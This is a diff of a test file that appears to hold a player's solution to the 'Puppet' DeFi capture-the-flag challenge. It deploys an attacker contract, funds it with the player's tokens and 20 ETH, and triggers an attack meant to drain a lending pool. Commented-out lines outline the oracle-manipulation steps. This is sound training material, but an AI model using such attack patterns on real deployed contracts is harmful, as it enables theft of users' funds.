@@ -96,34 +96,32 @@ describe('[Challenge] Puppet', function () {
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
         // Deploy
-        const attacker = await (await ethers.getContractFactory('PuppetAttacker', player)).deploy(
+        const attacker = await (await ethers.getContractFactory('PuppetAttacker', deployer)).deploy(
             uniswapExchange.address,
             token.address,
             lendingPool.address,
-            { value: ethers.utils.parseEther('20') }
+            player.address
         );
 
         // TESTS
         // const bal = await token.balanceOf(player.address)
         // await token.connect(player).approve(uniswapExchange.address, bal);
-        // const timestamp = (await ethers.provider.getBlock('latest')).timestamp * 2
+        // const ts = (await ethers.provider.getBlock('latest').timestamp) * 2
         // await uniswapExchange.connect(player).tokenToEthSwapInput(bal, 1, timestamp);
         // await lendingPool.calculateDepositRequired(100000).then(r => console.log("Eth required", r.toString()))
-
 
         // Transfer player's DVT tokens to the attack contract
         const initialAttackerBalance = await token.balanceOf(player.address);
         await token.connect(player).transfer(attacker.address, initialAttackerBalance);
 
         // ATTACK
-        await attacker.attack();
-
+        await attacker.attack({ value: ethers.utils.parseEther("20") });
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
         // Player executed a single transaction
-        // expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
+        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
 
         // Player has taken all tokens from the pool       
         expect(
